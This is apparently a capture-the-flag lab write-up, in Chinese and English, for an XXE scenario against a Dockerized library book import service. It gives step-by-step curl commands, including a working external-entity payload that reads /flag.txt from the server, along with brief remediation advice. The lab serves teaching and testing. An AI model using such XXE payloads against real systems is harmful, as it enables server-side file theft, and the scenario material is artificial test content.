# WEB-13: XXE XML External Entity

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-13 |
| 名称 | XXE XML External Entity |
| 技术/CVE | XXE (XML External Entity) |
| 难度 | L1 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10113 |

## 场景概述
- 技术：XXE (XML External Entity)
- 难度：L1
- 交付方式：docker
- 入口端口：10113
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | XXE (XML External Entity) |
| Difficulty | L1 |
| Port | 10113 |
| Path | scenarios/web/xxe-library/ |
| Type | docker |
| Service | Library Book Import Service |

### Attack Path Summary
```
User sends XML → lxml parser with resolve_entities=True → XXE via external entity → File read
```

### Prerequisites

#### Knowledge
- XML/DTD语法 (XML/DTD syntax): Understanding XML document structure and Document Type Definitions
- External Entity声明 (External Entity declaration): How DOCTYPE and ENTITY declarations work in XML
- 带内XXE (in-band XXE): XXE attacks where data is returned directly in the HTTP response

#### Tools
- curl: Send crafted XML payloads via HTTP POST requests
- Burp Suite: Repeater for testing and modifying XML payloads interactively

### Step-by-Step Exploitation

#### Step 1: Access the Library Service

Open the service and observe the XML book import functionality.

```bash
curl http://localhost:10113/
```

#### Step 2: Send Normal Book XML

Test the service with a standard XML payload to confirm it accepts and processes XML input correctly.

```bash
curl -X POST http://localhost:10113/addbook -d '<book><title>Test</title></book>'
```

#### Step 3: Craft XXE Payload

Inject a DOCTYPE declaration with an external entity that reads the flag file and includes its contents in the response.

```bash
curl -X POST http://localhost:10113/addbook -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><book><title>&xxe;</title></book>'
```

#### Step 4: Retrieve the Flag

The flag file content is substituted in place of the `&xxe;` entity reference and returned in the HTTP response.

### Flag Location
- `/flag.txt` on the server filesystem

### Verification Commands
```bash
curl -s -X POST http://localhost:10113/addbook -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><book><title>&xxe;</title></book>' | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | XML parser request handling |
| 侦察与前置条件 | External entity resolution behavior and readable local paths |
| 核心漏洞与利用 | Define an XML external entity for local file disclosure |
| 权限、横向或影响 | Server-side file read |
| 验证 | Submit the XML payload and extract the flag from the parser response |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
